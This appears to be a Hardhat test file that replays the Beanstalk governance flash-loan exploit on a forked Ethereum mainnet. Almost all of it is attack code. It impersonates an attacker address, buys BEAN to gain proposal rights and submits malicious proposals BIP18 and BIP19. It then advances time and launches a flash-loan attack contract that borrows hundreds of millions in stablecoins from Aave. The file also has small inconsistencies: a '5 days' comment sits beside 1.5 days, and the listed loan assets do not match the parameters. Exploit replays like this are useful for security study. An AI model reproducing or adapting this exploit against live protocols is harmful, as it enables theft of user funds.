import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import hre from 'hardhat';
const { ethers } = hre;
import { Event } from "ethers";

describe("BeansFarm", function () {
  async function deployFixture() {
    /* ------------------------ WHALE ----------------------- */
    const WHALE_BINANCE = '0xF977814e90dA44bFA03b6295A0616a897441aceC';
    const ATTACKR = '0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4';
    const attacker = await ethers.getImpersonatedSigner(ATTACKR);
    const wahle = await ethers.getImpersonatedSigner(WHALE_BINANCE);
    wahle.sendTransaction({ to: attacker.address, value: ethers.utils.parseEther('1000') });
    /* ------------------------ TOKEN ----------------------- */
    const DAI_TOKEN_ADDRESS = '0x6B175474E89094C44Da98b954EedeAC495271d0F';
    const USDC_TOKEN_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
    const USDT_TOKEN_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
    const BEAN_TOKEN_ADDRESS = '0xDC59ac4FeFa32293A95889Dc396682858d52e5Db';
    const LUSD_TOKEN_ADDRESS = '0x5f98805A4E8be255a32880FDeC7F6728C6568bA0';

    const usdcToken = await ethers.getContractAt('IERC20', USDC_TOKEN_ADDRESS);
    const usdtToken = await ethers.getContractAt('IERC20', USDT_TOKEN_ADDRESS);

    const beanToken = await ethers.getContractAt('IERC20', BEAN_TOKEN_ADDRESS);
    const lusdToken = await ethers.getContractAt('IERC20', LUSD_TOKEN_ADDRESS);
    const daiToken = await ethers.getContractAt('IERC20', DAI_TOKEN_ADDRESS);
    /* ------------------------ AAVE ------------------------ */
    const AAVE_LENDING_POOL_ADDRESS_PROVIDER = '0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5';
    /* ----------------------- UNISWAP ---------------------- */
    const UNISWAP_ROUTER = '0x7a250d5630b4cf539739df2c5dacb4c659f2488d';
    const uniswapRouter = await ethers.getContractAt("IUniswapV2Router02", UNISWAP_ROUTER);
    /* ---------------------- Beanstalk --------------------- */
    // https://etherscan.io/address/0xc1e088fc1323b20bcbee9bd1b9fc9546db5624c5#code
    const DIAMOND_ADDRESS = '0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5';
    const diamond = await ethers.getContractAt(
      'IDiamond',
      DIAMOND_ADDRESS,
    );
    const [owner, otherAccount] = await ethers.getSigners();
    return { diamond, attacker, BEAN_TOKEN_ADDRESS, uniswapRouter, owner, otherAccount, beanToken, usdcToken, usdtToken, lusdToken, daiToken, AAVE_LENDING_POOL_ADDRESS_PROVIDER };
  }
  it("Relk", async function () {
    /* ------------------------------------------------------ */
    /*                    Swap ETH to BEANS                   
    /* ------------------------------------------------------ */
    const WETH_TOKEN_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
    const fixture = await loadFixture(deployFixture);
    const {
      diamond, attacker, uniswapRouter,
      BEAN_TOKEN_ADDRESS, beanToken,
      usdcToken, lusdToken, daiToken, usdtToken,
      AAVE_LENDING_POOL_ADDRESS_PROVIDER,
    } = fixture;
    await uniswapRouter.connect(attacker).swapExactETHForTokens(
      0,
      [WETH_TOKEN_ADDRESS, BEAN_TOKEN_ADDRESS],
      attacker.address,
      BigInt(Math.round(Date.now() / 1000)),
      { value: ethers.utils.parseEther('74') }
    );
    /* ------------------------------------------------------ */
    /*    Deposit beans to Beanstalk to create a proposal
    /* ------------------------------------------------------ */
    const totalBeans = await beanToken.connect(attacker).balanceOf(attacker.address);
    await beanToken.connect(attacker).approve(diamond.address, BigInt(99999999999999));
    await diamond.connect(attacker).depositBeans(totalBeans);
    /* ------------------------------------------------------ */
    /*                      Propose BIP18                     */
    /* ------------------------------------------------------ */
    const exploitBipFactory = await ethers.getContractFactory("ExploitBip18");
    const exploitBip = await exploitBipFactory.deploy();
    const tx18 = await (await diamond.connect(attacker).propose([], exploitBip.address, exploitBip.interface.encodeFunctionData("init"), 3)).wait();
    const proposeEvent18 = (tx18.events?.filter((x) => {
      return x.topics[0] == '0x3fdb4350f6a72c9d62f38604cf6f7c0714650de93222712d9668ec04926eb250';
    })) as Event[];
    const attackProposeId18 = parseInt(proposeEvent18[0]?.topics[2]);
    expect(attackProposeId18).to.equal(18);
    /* ------------------------------------------------------ */
    /*                      Propose BIP19                     */
    /* ------------------------------------------------------ */
    const exploitBip19Factory = await ethers.getContractFactory("InitBip18");
    const exploitBip19 = await exploitBip19Factory.deploy();
    const tx19 = await (await diamond.connect(attacker).propose([], exploitBip19.address, exploitBip19.interface.encodeFunctionData("init"), 3)).wait();
    const proposeEvent19 = (tx19.events?.filter((x) => {
      return x.topics[0] == '0x3fdb4350f6a72c9d62f38604cf6f7c0714650de93222712d9668ec04926eb250';
    })) as Event[];
    const attackProposeId19 = parseInt(proposeEvent19[0]?.topics[2].toString());
    expect(attackProposeId19).to.equal(19);
    /* ------------------------------------------------------ */
    /*                   Let the Bullets Fly                  */
    /* ------------------------------------------------------ */
    await ethers.provider.send("evm_increaseTime", [1.5 * 24 * 60 * 60]); // 5 days
    /* ------------------------------------------------------ */
    /*                     Launch the hack                    */
    /* ------------------------------------------------------ */
    const originalBalance = +(ethers.utils.formatEther(await attacker.getBalance()));
    console.log("ETH Balance before exploit - ", originalBalance);
    const abi = new ethers.utils.AbiCoder();
    const BIP18FlashLoanAttacker = await ethers.getContractFactory("BIP18FlashLoanAttacker");
    const bIP18FlashLoanAttacker = await BIP18FlashLoanAttacker.deploy(AAVE_LENDING_POOL_ADDRESS_PROVIDER);
    // Flashloan 350,000,000 DAI, 500,000,000 USDC, 150,000,000 USDT, 32, 425,202 BEAN, and 11,643,065 LUSD
    const flashLaonParameters = {
      receiverAddress: bIP18FlashLoanAttacker.address,
      assets: [
        daiToken.address,
        usdcToken.address,
        usdtToken.address,
      ],
      amounts: [
        BigInt(350000000 * 10 ** await daiToken.decimals()),
        BigInt(500000000 * 10 ** await usdcToken.decimals()),
        BigInt(150000000 * 10 ** await usdtToken.decimals()),
      ],
      modes: [
        0,
        0,
        0,
      ],
      params: abi.encode(
        ['address', 'address', 'address', 'address', 'address', 'address'],
        [attacker.address, daiToken.address, usdcToken.address, usdtToken.address, beanToken.address, lusdToken.address],
      ),
    };

    await bIP18FlashLoanAttacker.connect(attacker).attack(
      flashLaonParameters.receiverAddress,
      flashLaonParameters.assets,
      flashLaonParameters.amounts,
      flashLaonParameters.modes,
      flashLaonParameters.params,
    );

    const afterBalance = +(ethers.utils.formatEther(await attacker.getBalance()));
    expect(afterBalance).to.gte(originalBalance);
    console.log("ETH Balance after exploit - ", afterBalance);
  }).timeout(100000);
});
